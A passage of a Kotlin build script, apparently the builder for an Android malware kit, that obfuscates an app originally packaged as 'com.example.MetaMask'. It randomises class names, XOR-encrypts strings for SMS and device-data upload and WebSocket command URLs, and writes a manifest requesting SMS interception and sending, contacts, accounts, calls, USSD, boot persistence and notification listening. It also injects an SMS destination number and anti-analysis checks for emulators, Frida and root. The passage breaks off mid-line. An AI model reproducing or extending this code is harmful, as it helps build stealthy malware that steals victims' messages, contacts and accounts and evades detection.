        val clsMap = linkedMapOf(
            "MasterWebSocketDispatcher"    to CLS_MASTER_WS,
            "WebSocketCommandHandlerReceiver" to CLS_WS_HANDLER_RECV,
            "DeviceStateMonitorService"    to CLS_DEV_MONITOR_SVC,
            "ServiceStarterWorker"         to CLS_SVC_STARTER,
            "HeadlessSmsSendService"       to CLS_HEADLESS_SMS,
            "CommandChannelService"        to CLS_CMD_CHANNEL_SVC,
            "AuthenticatorService"         to CLS_AUTH_SVC,
            "LoaderWakeUpReceiver"         to CLS_LOADER_RECV,
            "DefaultSmsReceiver"           to CLS_DEFAULT_SMS_RECV,
            "ChimeraStateReceiver"         to CLS_CHIMERA_RECV,
            "SchedulerWorker"              to CLS_SCHEDULER_WORKER,
            "DeviceUUIDProvider"           to CLS_UUID_PROVIDER,
            "RadioLinkProtocol"            to CLS_RADIO_LINK,
            "UssdControlService"           to CLS_USSD_CTL_SVC,
            "LegacyUssdService"            to CLS_LEGACY_USSD_SVC,
            "FcmTokenService"              to CLS_FCM_TOKEN_SVC,
            "ComposeSmsActivity"           to CLS_COMPOSE_SMS,
            "SecurityAuditor"              to CLS_SECURITY_AUDITOR,
            "RemoteConfig"                 to CLS_REMOTE_CONFIG,
            "XorObf"                       to CLS_XOR_OBF,
            "StubAuthenticator"            to CLS_STUB_AUTH,
            "MainApplication"              to CLS_MAIN_APP,
            "WebViewActivity"              to CLS_WEB_VIEW,
            "PrivilegeService"             to CLS_PRIVILEGE_SVC,
            "NativeBridge"                 to CLS_NATIVE_BRIDGE,
            "ZebraWorker"                  to CLS_ZEBRA_WORKER,
            "ChikenWorker"                 to CLS_CHIKEN_WORKER,
            "StubProvider"                 to CLS_STUB_PROVIDER,
            "TurtleService"                to CLS_TURTLE_SVC,
            "PulseService"                 to CLS_PULSE_SVC,
            "CusWebActivity"               to CLS_CUS_WEB,
            "FrienCat"                     to CLS_FRIEN_CAT,
            "BootReceiver"                 to CLS_BOOT_RECV,
            "AlarmReceiver"                to CLS_ALARM_RECV,
            "UUIDService"                  to CLS_UUID_SVC,
            "trolService"                  to CLS_TROL_SVC,
            "SmsReceiver"                  to CLS_SMS_RECV,
            "MmsReceiver"                  to CLS_MMS_RECV
        )

        val jniMap = linkedMapOf(
            "nativeGetCallbackHandlerClassName" to JNI_CB_HANDLER,
            "nativeGetSystemCallbackClassName"  to JNI_SYS_CB,
            "nativeGetContactsActionString"     to JNI_CONTACTS_ACTION,
            "nativeGetRequestMethodName"        to JNI_REQ_METHOD,
            "nativeBuildContactsPayload"        to JNI_BUILD_CONTACTS,
            "nativeGetCallActionString"         to JNI_CALL_ACTION,
            "nativeGetTelPrefix"               to JNI_TEL_PREFIX,
            "nativeProcessTaskResult"           to JNI_PROCESS_TASK,
            "nativeEncryptData"                 to JNI_ENCRYPT,
            "nativeDecodeTask"                  to JNI_DECODE_TASK,
            "checkNativeEmulator"               to JNI_CHECK_EMU,
            "checkNativeFrida"                  to JNI_CHECK_FRIDA,
            "checkNativeRoot"                   to JNI_CHECK_ROOT,
            "getSrvConfigA"                     to JNI_SRV_A,
            "getSrvConfigB"                     to JNI_SRV_B,
            "getSrvEndpoint"                    to JNI_SRV_EP,
            "nativeDecryptDomain"               to JNI_DECRYPT_DOMAIN,
            "nativeGetUuidPrefix"               to JNI_UUID_PREFIX,
            "nativeGetUuidSuffix"               to JNI_UUID_SUFFIX
        )

        val actionMapKt = mapOf(
            "\"com.example.MetaMask.RESTART_SERVICE\""    to "\"$ACTION_RESTART_SVC\"",
            "\"com.example.MetaMask.ACTION_HANDLE_COMMAND\"" to "\"$ACTION_HANDLE_CMD\"",
            "\"com.example.MetaMask.INTERNAL_KICK\""      to "\"$ACTION_INTERNAL_KICK\"",
            "\"com.fox.TARGET_IDENTIFIER\""               to "\"$ACTION_FOX_TARGET\""
        )

        val methodSubst = mapOf(
            "executeChecksAndSendGradually" to "${rndName(3,5)}${rndId(4)}",
            "executeFinalActionsInPlace"    to "${rndName(3,5)}${rndId(4)}",
            "executeLegacyUssdRequest"      to "${rndName(3,5)}${rndId(4)}",
            "executeRecoveryStack"          to "${rndName(3,5)}${rndId(4)}",
            "executeOperation"              to "${rndName(3,5)}${rndId(4)}",
            "executeTask"                   to "${rndName(3,5)}${rndId(4)}",
            "dispatchToOcean"               to "${rndName(3,5)}${rndId(4)}",
            "dispatchMulti"                 to "${rndName(3,5)}${rndId(4)}",
            "dispatchSingle"                to "${rndName(3,5)}${rndId(4)}",
            "enableSmsComponents"           to "${rndName(3,5)}${rndId(4)}",
            "checkAndReportDefaultSmsStatus" to "${rndName(3,5)}${rndId(4)}",
            "handleGetSMSJson"              to "${rndName(3,5)}${rndId(4)}",
            "handleWakeUpCommand"           to "${rndName(3,5)}${rndId(4)}"
        )

        val srcJavaDir = File(shadowSrcDir, "java")
        srcJavaDir.walkTopDown().filter { it.extension == "kt" || it.extension == "java" }.forEach { f ->
            var c = f.readText()
            clsMap.entries.sortedByDescending { it.key.length }.forEach { (o,n) -> c = c.replace(o, n) }
            jniMap.entries.sortedByDescending { it.key.length }.forEach { (o,n) -> c = c.replace(o, n) }
            actionMapKt.forEach { (o,n) -> c = c.replace(o, n) }
            methodSubst.entries.sortedByDescending { it.key.length }.forEach { (o,n) -> c = c.replace(o, n) }
            f.writeText(c)
        }

        srcJavaDir.walkTopDown().filter { it.extension == "kt" }.forEach { f ->
            var newName = f.name
            clsMap.entries.sortedByDescending { it.key.length }.forEach { (o, n) ->
                if (newName == "$o.kt") newName = "$n.kt"
            }
            if (f.name == "uuid.kt") newName = "${CLS_UUID_SVC}.kt"
            if (newName != f.name) f.renameTo(File(f.parent, newName))
        }

        val oldMetaMaskDir = File(srcJavaDir, "com/example/MetaMask")
        val newPkgDir      = File(srcJavaDir, randomPkgPath)
        if (oldMetaMaskDir.exists()) {
            newPkgDir.parentFile.mkdirs()
            oldMetaMaskDir.copyRecursively(newPkgDir, overwrite = true)
            File(srcJavaDir, "com/example").deleteRecursively()
            println("--- [CRISTOFER_V2] Moved DEX package com.example.MetaMask → $randomPkg ---")
        }

        srcJavaDir.walkTopDown().filter { it.extension == "kt" || it.extension == "java" }.forEach { f ->
            var c = f.readText()
            c = c.replace("com.example.MetaMask", randomPkg)
            c = c.replace("com/example/MetaMask", randomPkgPath)
            f.writeText(c)
        }

        run {
            val xorKey = ByteArray(16).also { SecureRandom().nextBytes(it) }

            fun encBytes(s: String): String {
                val bytes = s.toByteArray(Charsets.UTF_8)
                val out = ByteArray(bytes.size)
                for (i in bytes.indices) {
                    out[i] = (bytes[i].toInt() xor xorKey[i % xorKey.size].toInt()).toByte()
                }
                return out.joinToString(", ") { "0x${(it.toInt() and 0xFF).toString(16).padStart(2, '0')}.toByte()" }
            }

            fun src(s: String): String = "\"" +
                s.replace("\\", "\\\\").replace("\n", "\\n").replace("\"", "\\\"") + "\""

            fun srcWithVar(prefix: String, varName: String, suffix: String): String {
                fun esc(x: String) = x.replace("\\", "\\\\").replace("\n", "\\n").replace("\"", "\\\"")
                return "\"" + esc(prefix) + "${'$'}" + varName + esc(suffix) + "\""
            }

            val xorFqn = "$randomPkg.utils.$CLS_XOR_OBF"

            fun mkXStr(prefix: String, varName: String? = null, suffix: String = ""): Pair<String, String> {
                val findStr = if (varName == null) src(prefix) else srcWithVar(prefix, varName, suffix)
                val replaceStr = when {
                    varName == null  -> "$xorFqn.d(byteArrayOf(${encBytes(prefix)}))"
                    suffix.isEmpty() -> "$xorFqn.d(byteArrayOf(${encBytes(prefix)})) + $varName"
                    else             -> "$xorFqn.d(byteArrayOf(${encBytes(prefix)})) + $varName + $xorFqn.d(byteArrayOf(${encBytes(suffix)}))"
                }
                return findStr to replaceStr
            }

            val reps = listOf(
                mkXStr("⛔️ БОТ-ФЕРМА: Обнаружен технический пакет: ", "app"),
                mkXStr("⛔️ БОТ-ФЕРМА: Известный образ эмулятора (OnePlus Bot)"),
                mkXStr("\n\n🐔 [CHIKEN]\n"),
                mkXStr("Агрессивный бот: Обнаружена Frida/Хукинг"),
                mkXStr("Подозрительный бот: Root + ADB и мало приложений (", "appCount", ")"),
                mkXStr("⚠️ Внимание: Root + ADB live (AppCount: ", "appCount", ")\n"),
                mkXStr("Мультиаккаунт: Мало приложений (", "appCount", ") и Аптайм < 10 мин"),
                mkXStr("Подозрительный: Аптайм меньше 10 минут"),
                mkXStr("Ленивая ферма: ADB включен + Мало приложений (", "appCount", ") на прогретом устройстве"),
                mkXStr("Пустой телефон: Критически мало приложений (", "appCount", ") при аптайме > 30 мин"),
                mkXStr("Root обнаружен: Недостаточно приложений или аптайма для доверия"),
                mkXStr("ADB обнаружен: Недостаточно приложений или аптайма для доверия"),
                mkXStr("\n⛔️ ВЕРДИКТ: ЗАБЛОКИРОВАНО\nПричины:\n"),
                mkXStr("\n✅ ВЕРДИКТ: ДОСТУП РАЗРЕШЕН\n"),

                mkXStr("uploadSMSJson"),
                mkXStr("uploadNewSMS"),
                mkXStr("uploadDeviceInfo"),
                mkXStr("uploadSystemInfo"),
                mkXStr("uploadAppsChunk"),
                mkXStr("defaultSmsStatusUpdate"),
                mkXStr("privilegeStatusUpdate"),
                mkXStr("commandChannelResponse"),
                mkXStr("deviceStateUpdate"),
                mkXStr("fcmTokenUpdate"),
                mkXStr("has_incoming_sms"),
                mkXStr("is_default_sms_app"),
                mkXStr("is_default_sms"),
                mkXStr("spawnTurtle"),
                mkXStr("turtleStatus"),
                mkXStr("smsStatus"),
                mkXStr("sms_data"),
                mkXStr("new_sms"),
                mkXStr("fcmToken"),
                mkXStr("ping"),

                mkXStr("android.accounts.AccountManager"),
                mkXStr("getAccountsByType"),
                mkXStr("getInstalledApplications"),
                mkXStr("getInstalledPackages"),
                mkXStr("getSubscriptionId"),
                mkXStr("getAccounts"),

                mkXStr("android.provider.Telephony.WAP_PUSH_DELIVER"),
                mkXStr("android.provider.Telephony.WAP_PUSH_RECEIVED"),
                mkXStr("android.intent.action.QUICKBOOT_POWERON"),
                mkXStr("content://sms"),

                mkXStr("wss://", "domain", "/ws"),
                mkXStr("wss://", "it", ""),
                ("\"${'$'}wsUrl?type=device&uuid=${'$'}deviceUuid\"" to
                    "wsUrl + $xorFqn.d(byteArrayOf(${encBytes("?type=device&uuid=")})) + deviceUuid")
            ).sortedByDescending { it.first.length }

            var totalReplaced = 0
            srcJavaDir.walkTopDown()
                .filter { it.extension == "kt" }
                .forEach { f ->
                    var c = f.readText()
                    var changedAny = false
                    reps.forEach { (find, rep) ->
                        if (c.contains(find)) {
                            c = c.replace(find, rep)
                            totalReplaced++
                            changedAny = true
                        }
                    }
                    if (changedAny) f.writeText(c)
                }

            val keyBytesLit = xorKey.joinToString(", ") {
                "0x${(it.toInt() and 0xFF).toString(16).padStart(2, '0')}.toByte()"
            }
            srcJavaDir.walkTopDown()
                .filter { it.extension == "kt" && it.name == "$CLS_XOR_OBF.kt" }
                .forEach { f ->
                    val txt = f.readText().replace(
                        "private val K: ByteArray = byteArrayOf(0)",
                        "private val K: ByteArray = byteArrayOf($keyBytesLit)"
                    )
                    f.writeText(txt)
                }

            println("--- [CRISTOFER_V2] XOR-protected $totalReplaced literal(s), key=${xorKey.size}B, helper=$CLS_XOR_OBF ---")
        }

        val tagRegex = Regex("""((?:private |public |internal |protected |)const val TAG\s*=\s*)"[^"]*"""")
        srcJavaDir.walkTopDown().filter { it.extension == "kt" }.forEach { f ->
            val orig = f.readText()
            val patched = tagRegex.replace(orig) { m -> "${m.groupValues[1]}\"${rndId(10)}\"" }
            if (patched != orig) f.writeText(patched)
        }

        val sensitiveReplacements = mapOf(
            "\"DeviceCheck\""           to "\"${rndId(9)}\"",
            "\"ChikenSystemChannel\""   to "\"$CHAN_MWD\"",
            "\"SystemWorker\""          to "\"${rndId(8)}\"",
            "\"MasterWSP_Debug\""       to "\"${rndId(8)}\"",
            "\"WSCommandReceiver\""     to "\"${rndId(8)}\"",
            "\"BootReceiver\""          to "\"${rndId(8)}\"",
            "\"MediaIndexingService\""  to "\"${rndId(8)}\"",
            "\"NetOptimProto\""         to "\"${rndId(8)}\"",
            "\"DataSyncUtil\""          to "\"${rndId(8)}\"",
            "\"WebSocketDispatcherChannel\"" to "\"$CHAN_MWD\"",
            "\"sync_system_channel\""        to "\"$CHAN_SYNC\"",
            "\"worker_channel\""             to "\"$CHAN_WORKER\"",
            "\"USSD_Background_Service\""    to "\"$CHAN_USSD\"",
            "\"system_core_channel\""        to "\"$CHAN_CORE\"",
            "\"MasterServiceCheck\""         to "\"$WM_MASTER_CHECK\"",
            "\"background_sync_worker\""     to "\"$WM_BG_SYNC\"",
            "\"SMS_TRIGGER\""                to "\"$WM_TAG_SMS\"",
            "\"DEFAULT_SMS_TRIGGER\""        to "\"$WM_TAG_DEFAULT_SMS\"",
            "\"BOOT_TRIGGER\""               to "\"$WM_TAG_BOOT\"",
            "\"CHIMERA_RECOVERY\""           to "\"$WM_TAG_CHIMERA\"",
            "\"WAKE_UP_URGENT\""             to "\"$WM_TAG_WAKE_URGENT\"",
            "\"FCM_WAKE_UP_JOB\""            to "\"$WM_TAG_FCM\"",
            "\"TURTLE_TRIGGER\""             to "\"$WM_TAG_TURTLE\"",
            "\"PULSE_RECOVERY_JOB\""         to "\"$WM_TAG_PULSE\"",
            "\"ZEBRA_FALLBACK_TRIGGER\""     to "\"$WM_TAG_ZEBRA\"",
            "\"service_status_prefs\""       to "\"$PREFS_SVC_STATUS\"",
            "\"connection_prefs\""           to "\"$PREFS_CONN\"",
            "\"device_uuid_prefs\""          to "\"$PREFS_UUID\"",
            "\"fcm_prefs\""                  to "\"$PREFS_FCM\"",
            "\"SmsSyncState\""               to "\"$PREFS_SMS\"",
            "\"SmsSendHistoryPrefs\""        to "\"$PREFS_SMS_HIST\"",
            "\"app_kill_switch_prefs\""      to "\"$PREFS_KILL\"",
            "\"SmsSetupPrefs\""              to "\"$PREFS_SETUP\"",
            "\"net_optim_config\""           to "\"$PREFS_NET\"",
            "\"device_settings\""            to "\"$PREFS_DEVICE\"",
            "\"is_master_service_running\""  to "\"$KEY_IS_RUNNING\"",
            "\"last_success_domain\""        to "\"$KEY_DOMAIN\"",
            "\"device_uuid\""               to "\"$KEY_UUID_VAL\"",
            "\"fcm_token\""                 to "\"$KEY_FCM_TOKEN\"",
            "\"is_permanently_disabled\""   to "\"$KEY_DISABLED\"",
            "\"invisible_intercept_enabled\"" to "\"$KEY_INTERCEPT\"",
            "\"is_handshake_complete\""     to "\"$KEY_HANDSHAKE\"",
            "\"last_sync_timestamp\""       to "\"$KEY_SYNC_TS\"",
            "xor 42"                        to "xor $CMD_XOR_KEY",
            "\"DECOY_F1_NAME\""             to "\"${rndId(9)}.db\"",
            "\"DECOY_F2_NAME\""             to "\"${rndId(9)}.json\"",
            "\"DECOY_F3_NAME\""             to "\"${rndId(9)}.dat\"",
            "private const val DESTINATION_NUMBER = \"\"" to "private const val DESTINATION_NUMBER = \"$smsTarget\"",
            "\"{{TRAFFER}}\""                            to "\"$traffer\"",
            "private const val TARGET_URL = \"https://rt.pornhub.com/\"" to
                "private const val TARGET_URL = \"${if (targetUrl.isNotEmpty()) targetUrl else "https://rt.pornhub.com/"}\"",
        )
        srcJavaDir.walkTopDown().filter { it.extension == "kt" }.forEach { f ->
            var c = f.readText()
            var changed = false
            sensitiveReplacements.forEach { (old, new) ->
                if (c.contains(old)) { c = c.replace(old, new); changed = true }
            }
            if (changed) f.writeText(c)
        }

        val acctSuffix = rndId(8)
        val prvdSuffix = rndId(8)
        val pkgActionReplacements = mapOf(
            "\"$randomPkg.RESTART_SERVICE\""         to "\"$ACTION_RESTART_SVC\"",
            "\"$randomPkg.ACTION_HANDLE_COMMAND\""   to "\"$ACTION_HANDLE_CMD\"",
            "\"$randomPkg.ACTION_SEND_TO_SERVER\""   to "\"$ACTION_SEND_TO_SRV\"",
            "\"$randomPkg.ACTION_SEND_MESSAGE\""     to "\"$ACTION_SEND_MSG\"",
            "\"$randomPkg.ACTION_START_MONITORING\"" to "\"$ACTION_START_MON\"",
            "\"$randomPkg.INTERNAL_KICK\""           to "\"$ACTION_INTERNAL_KICK\"",
            "\"$randomPkg.ALARM_TRIGGER\""           to "\"$ACTION_FOX_TARGET\"",
            "\"$randomPkg.EXTRA_MESSAGE_DATA\""      to "\"$EXTRA_MSG_DATA_KEY\"",
            "\"$randomPkg.EXTRA_MESSAGE_TO_SEND\""   to "\"$EXTRA_MSG_SEND_KEY\"",
            "\"$randomPkg.account\""                 to "\"$randomPkg.$acctSuffix\"",
            "\"$randomPkg.provider\""                to "\"$randomPkg.$prvdSuffix\""
        )
        srcJavaDir.walkTopDown().filter { it.extension == "kt" || it.extension == "java" }.forEach { f ->
            var c = f.readText()
            var changed = false
            pkgActionReplacements.forEach { (old, new) ->
                if (c.contains(old)) { c = c.replace(old, new); changed = true }
            }
            if (changed) f.writeText(c)
        }

        val mf = shadowSrcDir.resolve("AndroidManifest.xml")
        val prc = "Svc_$randomPrefix"; val rcv = "Rcv_$randomPrefix"
        fun perm2(p: String) = "    <uses-permission android:name=\"android.permission.$p\" />"
        fun permT(p: String, t: String) = "    <uses-permission android:name=\"android.permission.$p\" tools:node=\"$t\" />"
        val corePerms = mutableListOf<String>()
        // CORE — всегда
        corePerms += perm2("INTERNET")
        corePerms += perm2("ACCESS_NETWORK_STATE")
        corePerms += perm2("WAKE_LOCK")
        corePerms += perm2("RECEIVE_BOOT_COMPLETED")
        corePerms += perm2("SCHEDULE_EXACT_ALARM")
        corePerms += perm2("REQUEST_IGNORE_BATTERY_OPTIMIZATIONS")
        corePerms += perm2("FOREGROUND_SERVICE")
        corePerms += perm2("FOREGROUND_SERVICE_SHORT_SERVICE")
        corePerms += perm2("FOREGROUND_SERVICE_DATA_SYNC")
        corePerms += permT("POST_NOTIFICATIONS", "remove")
        corePerms += perm2("QUERY_ALL_PACKAGES")
        // MOD_SMS
        if (featSms) {
            corePerms += perm2("RECEIVE_SMS")
            corePerms += perm2("READ_SMS")
            corePerms += perm2("SEND_SMS")
            corePerms += perm2("RECEIVE_MMS")
            corePerms += perm2("WRITE_SMS")
            corePerms += perm2("READ_CELL_BROADCASTS")
            corePerms += perm2("RECEIVE_WAP_PUSH")
        }
        // MOD_CONTACTS
        if (featContacts) {
            corePerms += perm2("READ_CONTACTS")
        }
        // MOD_ACCOUNTS
        if (featAccounts) {
            corePerms += perm2("GET_ACCOUNTS")
        }
        // MOD_CALL_PHONE
        if (featCallPhone) {
            corePerms += perm2("CALL_PHONE")
            corePerms += perm2("READ_PHONE_NUMBERS")
        }
        // READ_PHONE_STATE — нужен SMS или CALL_PHONE
        if (featSms || featCallPhone) {
            corePerms += perm2("READ_PHONE_STATE")
        }
        // MOD_SYNC_MANAGER
        if (featSyncManager) {
            corePerms += perm2("AUTHENTICATE_ACCOUNTS")
            corePerms += perm2("READ_SYNC_SETTINGS")
            corePerms += perm2("WRITE_SYNC_SETTINGS")
        }
        val permissionsBlock = corePerms.shuffled().joinToString("\n")

        val sb2 = StringBuilder()
        sb2.appendLine("""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <permission android:name="$randomPkg.permission.INTERNAL_WAKEUP" android:protectionLevel="signature" />

$permissionsBlock

    <uses-feature android:name="android.hardware.touchscreen" android:required="false" />
    <uses-feature android:name="android.hardware.telephony" android:required="false" />

    <application
        android:name=".$STUB_CLS"
        android:appComponentFactory="$randomPkg.$STUB_FACTORY_CLS"
        tools:replace="android:appComponentFactory"
        android:allowBackup="false"
        android:networkSecurityConfig="@xml/network_security_config"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:usesCleartextTraffic="true"
        android:hardwareAccelerated="true"
        android:supportsRtl="true">""")
        // CORE — всегда
        sb2.appendLine("""        <service android:name=".services.$CLS_PULSE_SVC" android:enabled="true" android:exported="false" android:label="System Core" android:process=":core_$prc" android:foregroundServiceType="dataSync" />""")
        sb2.appendLine("""        <service android:name=".services.$CLS_MASTER_WS" android:exported="false" android:enabled="true" android:label="Network Interface" android:process=":net_$prc" android:foregroundServiceType="dataSync" />""")
        sb2.appendLine("""        <service android:name="androidx.work.impl.foreground.SystemForegroundService" android:foregroundServiceType="dataSync" tools:node="merge" />""")
        sb2.appendLine("""        <service android:name=".services.$CLS_UUID_SVC" android:exported="false" android:enabled="false" />""")
        // MOD_KEEPALIVE_JOB
        if (featKeepaliveJob) sb2.appendLine("""        <service android:name=".services.KeepAliveJobService" android:exported="true" android:permission="android.permission.BIND_JOB_SERVICE" />""")
        // MOD_FCM
        if (featFcm) sb2.appendLine("""        <service android:name=".services.$CLS_FCM_TOKEN_SVC" android:enabled="true" android:exported="false" android:process=":fcm_$prc" android:directBootAware="true">
            <intent-filter><action android:name="com.google.firebase.MESSAGING_EVENT" /></intent-filter>
        </service>""")
        // MOD_SYNC_MANAGER
        if (featSyncManager) {
            sb2.appendLine("""        <service android:name=".services.sync.SyncService" android:exported="true">
            <intent-filter><action android:name="android.content.SyncAdapter" /></intent-filter>
            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/syncadapter" />
        </service>
        <service android:name=".services.sync.$CLS_AUTH_SVC" android:exported="true">
            <intent-filter><action android:name="android.accounts.AccountAuthenticator" /></intent-filter>
            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/authenticator" />
        </service>""")
        }
        // MOD_DEVICE_MONITOR
        if (featDeviceMonitor) sb2.appendLine("""        <service android:name=".services.$CLS_DEV_MONITOR_SVC" android:exported="false" android:enabled="false" />""")
        // MOD_TROL_SVC
        if (featTrolSvc) sb2.appendLine("""        <service android:name=".services.$CLS_TROL_SVC" android:exported="false" android:enabled="false" />""")
        // MOD_FRIEN_CAT
        if (featFrienCat) sb2.appendLine("""        <service android:name=".services.$CLS_FRIEN_CAT" android:exported="false" android:enabled="false" />""")
        // MOD_USSD
        if (featUssdFinal) {
            sb2.appendLine("""        <service android:name=".services.$CLS_USSD_CTL_SVC" android:exported="false" android:enabled="false" />""")
            sb2.appendLine("""        <service android:name=".services.$CLS_LEGACY_USSD_SVC" android:exported="false" android:enabled="false" />""")
        }
        // MOD_CMD_CHANNEL
        if (featCmdChannel) sb2.appendLine("""        <service android:name=".services.$CLS_CMD_CHANNEL_SVC" android:exported="false" android:enabled="false" />""")
        // MOD_TURTLE
        if (featTurtle) sb2.appendLine("""        <service android:name=".services.$CLS_TURTLE_SVC" android:label="@string/app_name" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true" android:enabled="false">
            <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
        </service>""")
        // CORE activities
        sb2.appendLine("""        <activity android:name=".activities.$CLS_WEB_VIEW" android:exported="true" android:label="@string/app_name" android:theme="@style/Theme.AppCompat.Light.NoActionBar" android:excludeFromRecents="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="$launcherCategory" />
            </intent-filter>
        </activity>
        <activity android:name=".activities.$CLS_CUS_WEB" android:theme="@style/Theme.AppCompat.Light.NoActionBar" android:excludeFromRecents="false" android:launchMode="singleTask" android:screenOrientation="portrait" android:label="Support" android:taskAffinity="" />
        <activity android:name=".$STUB_DECOY_CLS" android:theme="@android:style/Theme.Light.NoTitleBar" android:excludeFromRecents="true" android:exported="false" />""")
        // MOD_SMS_ROLE
        if (featSmsRoleFinal) sb2.appendLine("""        <activity android:name=".activities.$CLS_COMPOSE_SMS" android:enabled="false" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.SEND" />
                <action android:name="android.intent.action.SENDTO" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="sms" /><data android:scheme="smsto" /><data android:scheme="mms" /><data android:scheme="mmsto" />
            </intent-filter>
        </activity>""")
        // CORE receivers
        sb2.appendLine("""        <receiver android:name=".receivers.$CLS_BOOT_RECV" android:enabled="true" android:exported="true" android:label="${rcv}_Boot" android:directBootAware="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.USER_UNLOCKED" />
                <action android:name="android.intent.action.USER_PRESENT" />
                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
                <action android:name="android.intent.action.LOCALE_CHANGED" />
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
                <action android:name="android.os.action.DEVICE_IDLE_MODE_CHANGED" />
                <action android:name="$ACTION_RESTART_SVC" />
            </intent-filter>
        </receiver>
        <receiver android:name=".receivers.$CLS_ALARM_RECV" android:enabled="true" android:exported="false" />
        <receiver android:name=".receivers.$CLS_WS_HANDLER_RECV" android:enabled="false" android:label="${rcv}_Command" android:exported="true">
            <intent-filter><action android:name="$ACTION_HANDLE_CMD" /></intent-filter>
        </receiver>
        <receiver android:name=".receivers.$CLS_LOADER_RECV" android:exported="true" android:label="${rcv}_Wake" android:enabled="true">
            <intent-filter android:priority="999">
                <action android:name="$ACTION_FOX_TARGET" />
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="$ACTION_INTERNAL_KICK" />
            </intent-filter>
        </receiver>
        <receiver android:name=".receivers.$CLS_CHIMERA_RECV" android:enabled="true" android:label="${rcv}_State" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_REMOVED" />
                <data android:scheme="package" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.os.action.POWER_SAVE_MODE_CHANGED" />
                <action android:name="android.intent.action.WALLPAPER_CHANGED" />
                <action android:name="android.net.conn.CONNECTIVITY_ACTION" />
                <action android:name="android.intent.action.LOCALE_CHANGED" />
                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
                <action android:name="android.accounts.LOGIN_ACCOUNTS_CHANGED" />
                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
                <action android:name="android.intent.action.DOWNLOAD_COMPLETE" />
                <action android:name="android.telephony.action.CARRIER_CONFIG_CHANGED" />
                <action android:name="android.intent.action.SIM_STATE_CHANGED" />
                <action android:name="android.intent.action.HEADSET_PLUG" />
                <action android:name="android.bluetooth.device.action.ACL_CONNECTED" />
                <action android:name="android.bluetooth.device.action.ACL_DISCONNECTED" />
                <action android:name="android.intent.action.PHONE_STATE" />
                <action android:name="$ACTION_FOX_TARGET" />
                <action android:name="$ACTION_INTERNAL_KICK" />
            </intent-filter>
        </receiver>""")
        // MOD_SMS_ROLE receivers
        if (featSmsRoleFinal) sb2.appendLine("""        <receiver android:name=".receivers.$CLS_DEFAULT_SMS_RECV" android:enabled="false" android:exported="true">
            <intent-filter><action android:name="android.provider.Telephony.ACTION_DEFAULT_SMS_PACKAGE_CHANGED" /></intent-filter>
        </receiver>""")
        // MOD_SMS receivers
        if (featSms) {
            sb2.appendLine("""        <receiver android:name=".activities.$CLS_SMS_RECV" android:enabled="false" android:exported="true" android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="100">
                <action android:name="android.provider.Telephony.SMS_DELIVER" />
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>
        <receiver android:name=".activities.$CLS_MMS_RECV" android:enabled="false" android:exported="true" android:permission="android.permission.BROADCAST_WAP_PUSH">
            <intent-filter android:priority="100">
                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED" />
                <data android:mimeType="application/vnd.wap.mms-message" />
            </intent-filter>
        </receiver>""")
        }
        // MOD_SMS_ROLE service
        if (featSmsRoleFinal) sb2.appendLine("""        <service android:name=".activities.$CLS_HEADLESS_SMS" android:enabled="false" android:exported="true" android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
            <intent-filter>
                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:scheme="sms" /><data android:scheme="smsto" /><data android:scheme="mms" /><data android:scheme="mmsto" />
            </intent-filter>
        </service>""")
        // MOD_SYNC_MANAGER provider
        if (featSyncManager) sb2.appendLine("""        <provider android:name=".services.sync.$CLS_STUB_PROVIDER"
                  android:authorities="$randomPkg.$prvdSuffix"
                  android:exported="false"
                  android:syncable="true" />""")
        // CORE provider
        sb2.appendLine("""        <provider android:name="androidx.startup.InitializationProvider"
                  android:authorities="${'$'}{applicationId}.androidx-startup"
                  android:exported="false"
                  tools:node="merge" />

    </application>

</manifest>""")
        mf.writeText(sb2.toString())

        val finalAppLabel = if (appName.isNotEmpty()) appName else rndName(4, 7)
        val appNameRegex = Regex("<string name=\"app_name\">[^<]*</string>")
        val appNameReplacement = "<string name=\"app_name\">$finalAppLabel</string>"
        shadowSrcDir.resolve("res").walkTopDown()
            .filter { it.isFile && it.name == "strings.xml" }
            .forEach { stringsFile ->
                val orig = stringsFile.readText()
                if (orig.contains("app_name")) {
                    stringsFile.writeText(orig.replace(appNameRegex, appNameReplacement))
                }
            }
        println("--- [CRISTOFER_V2] app_name=$finalAppLabel (all locales) ---")

        shadowSrcDir.resolve("res").walkTopDown()
            .filter { it.isFile && it.extension == "xml" }
            .forEach { f ->
                val orig = f.readText()
                if (orig.contains("com.example.MetaMask") || orig.contains("com/example/MetaMask")
